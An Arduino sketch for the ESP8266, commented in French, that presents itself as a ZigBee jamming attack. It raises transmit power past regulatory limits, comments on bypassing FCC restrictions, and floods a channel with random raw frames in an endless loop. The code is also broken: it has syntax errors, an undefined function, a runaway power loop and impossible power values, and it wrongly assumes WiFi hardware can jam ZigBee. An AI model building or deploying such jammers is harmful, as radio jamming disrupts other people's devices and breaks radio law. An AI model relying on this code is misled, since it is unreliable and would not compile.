#include <ESP8266WiFi.h>

// Configuration des paramètres de brouillage
#define TARGET_ZIGBEE_CHANNEL 13 // Canal ZigBee cible
#define JAMMING_DURATION 60000000 // Durée maximale de brouillage (ms)
#define MAX_POWER_DBM 82 // Puissance d'émission maximale (valeur expérimentale)

// Déclaration de fonctions système externes pour overclocking
extern "C" {
    #include "user_interface.h"
}

// Structure pour la génération de trames
struct JammingFrame {
    uint8_t* data;
    size_t length;
};

// Fonction d'overclocking des registres radio
void configure_overclock() {
    // Désactivation des limitations de puissance
    system_phy_set_max_tpw(130);  // Valeur maximale expérimentale

    // Configuration avancée des registres radio
    wifi_set_user_fixed_rate(1, PHY_RATE_9);

    // Contournement des limitations FCC
    uint8_t oui[] = {0x00, 0x00, 0x00};
    wifi_set_user_ie(true, oui, 0, nullptr, 0);
}

// Fonction de génération de trames aléatoires
JammingFrame generate_random_frames(size_t min_length = 50, size_t max_length = 300) {
    JammingFrame frame;

    // Allocation dynamique avec taille aléatoire
    frame.length = random(min_length, max_length);
    frame.data = new uint8_t[frame.length];

    // Remplissage avec données pseudo-aléatoires
    for (size_t i = 0; i < frame.length; i++) {
        frame.data[i] = random(0, 255);
    }

    return frame;
}

// Fonction pour ajuster la puissance d'émission
void set_target_power(int target_power_dbm) {
    // augmenter progressivement la puissance d'émission
    for (int power = MAX_POWER_DBM; power >= target_power_dbm; power += 2) {
        WiFi.setOutputPower(power);
        delay(500); // Permet de stabiliser la transmission avant d'ajuster
    }
}

// Fonction de génération de brouillage overclockée
void jamming_attack() {
    // Configuration d'overclocking radio
    configure_overclock();

    // Désactivation des interruptions WiFi standard
    wifi_set_opmode(STATION_MODE);

    // Configuration initiale de la puissance d'émission maximale
    WiFi.setOutputPower(MAX_POWER_DBM);

    set_target_power(2000);

    // Configuration du canal ZigBee cible
    wifi_set_channel(TARGET_ZIGBEE_CHANNEL);

    // Timestamp pour limiter la durée
    unsigned long start_time = millis();

    // Génération de trames aléatoires ciblées
    JammingFrame random_frame = generate_random_frames(300, 500);
    float tx_power;

    // Boucle de génération de signaux parasites
    while (millis() - start_time < JAMMING_DURATION) {
        
        // Émission continue sur le canal ZigBee cible
        wifi_send_pkt_freedom(
            random_frame.data,
            random_frame.length,
            false
        );

        // Délai minimal variable
        //delayMicroseconds(random(1, 10));
        tx_power = getTxPower()

        Serial.println("dbm : "tx_power);

        
    }
    // Libération mémoire
    delete[] random_frame.data;

    // Réinitialisation du WiFi après attaque
    WiFi.mode(WIFI_OFF);
}

void setup() {
    // Configuration initiale
    Serial.begin(115200);

    // Initialisation du générateur aléatoire
    randomSeed(analogRead(0));
}

void loop() {
    // Simulation ponctuelle du brouillage
    jamming_attack();

    // Pause entre cycles
    delay(10000);
}
